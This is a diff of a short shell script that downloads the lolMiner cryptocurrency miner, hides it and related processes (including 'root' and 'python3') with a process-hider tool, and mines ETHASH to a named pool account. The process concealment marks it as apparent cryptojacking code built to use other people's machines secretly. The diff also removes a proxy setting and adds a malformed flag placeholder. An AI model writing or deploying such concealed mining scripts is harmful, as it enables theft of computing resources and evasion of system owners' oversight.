@@ -1,12 +1,5 @@
 #!/bin/sh
-pkill su
 pkill lolMiner
-nvidia-smi -caa
-sleep 9
-nvidia-smi -caa
-sleep 10
-nvidia-smi -caa
-sleep 30
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
 tar -xf lolMiner_v1.29_Lin64.tar.gz
 cd 1.29
@@ -24,5 +17,5 @@ Ph add python3
 ph add root
 ph add node-process-hider
 ph add lolMiner
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY socks 98.188.47.150:4145  --timeprint on --longstats 120
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY  --timeprint on --longstats 120 --singlethread [=arg(=-1)]
 sleep 10
